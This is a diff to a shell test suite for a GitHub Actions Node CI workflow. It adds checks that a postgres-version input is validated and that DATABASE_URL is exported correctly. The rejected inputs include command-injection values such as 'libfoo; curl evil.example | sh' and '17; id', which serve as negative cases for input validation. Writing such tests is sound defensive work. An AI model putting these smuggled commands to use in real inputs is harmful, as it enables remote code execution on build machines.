@@ -11,6 +11,7 @@ wf="$root/.github/workflows/node-ci.yml"
 for step in validate apt detect require scripts summary; do
   python3 "$root/tests/lib/extract-step.py" "$wf" node-ci "$step" > "$work/$step.sh" || exit 1
 done
+python3 "$root/tests/lib/extract-step.py" "$wf" validate postgres > "$work/postgres.sh" || exit 1
 
 # run_step <step> <dir> <workdir-label> [VAR=value...]: sets $out, $code, $outputs, $summary
 run_step() {
@@ -61,6 +62,16 @@ check "validate: apt-packages accepts Debian names" eval '[ $code = 0 ]'
 for bad in 'libfoo; curl evil.example | sh' 'ffmpeg  sox' ' ffmpeg' 'FFmpeg' '-o APT::x=1'; do
   v APT_PACKAGES="$bad"
   check "validate: apt-packages rejects '$bad'" eval '[ $code = 1 ] && has "$out" "::error::Input '"'"'apt-packages'"'"'"'
+done
+
+# --- validate job, postgres step: runs before the service image is pulled ---------------------
+for good in 17 16.4 18rc1 18beta2; do
+  run_step postgres "$fx/node-pg" fixtures/node-pg POSTGRES_VERSION="$good"
+  check "postgres: accepts '$good' and emits its alpine image" eval '[ $code = 0 ] && grep -qx "image=postgres:$good-alpine" <<< "$outputs"'
+done
+for bad in latest 17-alpine '17; id' '17 -c x=1' ' 17' 17.1.2 'x/evil'; do
+  run_step postgres "$fx/node-pg" fixtures/node-pg POSTGRES_VERSION="$bad"
+  check "postgres: rejects '$bad' and emits no image" eval '[ $code = 1 ] && has "$out" "::error::Input '"'"'postgres-version'"'"'" && ! has "$outputs" image='
 done
 
 # --- apt (sudo stubbed: it records each call, one argument per line) ------------------------
@@ -133,6 +144,19 @@ check "scripts: the env fixture fails without its variable" eval '[ $code = 1 ] 
 
 run_step scripts "$work/npm" npm PM=npm "NAMES=lint toString" BUILD_ENV=
 check "scripts: an Object.prototype key is absent, not run" eval '[ $code = 0 ] && grep -qx "results=lint=success toString=absent" <<< "$outputs"'
+
+# DATABASE_URL: set only with postgres-version, before the caller's env lines.
+mkdir -p "$work/pg"
+cat > "$work/pg/package.json" <<'PKG'
+{ "name": "pg-probe", "version": "1.0.0", "private": true,
+  "scripts": { "probe": "node -e \"require('fs').writeFileSync('url.txt', process.env.DATABASE_URL ?? 'unset')\"" } }
+PKG
+run_step scripts "$work/pg" pg PM=npm NAMES=probe BUILD_ENV= POSTGRES_VERSION=17
+check "scripts: postgres-version exports DATABASE_URL to the test database" eval '[ $code = 0 ] && [ "$(cat "$work/pg/url.txt")" = postgres://postgres@127.0.0.1:5432/test ]'
+run_step scripts "$work/pg" pg PM=npm NAMES=probe BUILD_ENV= POSTGRES_VERSION=
+check "scripts: without postgres-version DATABASE_URL stays unset, not empty" eval '[ $code = 0 ] && [ "$(cat "$work/pg/url.txt")" = unset ]'
+run_step scripts "$work/pg" pg PM=npm NAMES=probe BUILD_ENV=DATABASE_URL=postgres://x@h/db POSTGRES_VERSION=17
+check "scripts: a caller env line overrides DATABASE_URL" eval '[ $code = 0 ] && [ "$(cat "$work/pg/url.txt")" = postgres://x@h/db ]'
 
 # --- summary -------------------------------------------------------------------------------
 run_step summary "$fx/node-pnpm" fixtures/node-pnpm PM=pnpm "NAMES=lint typecheck test build" \
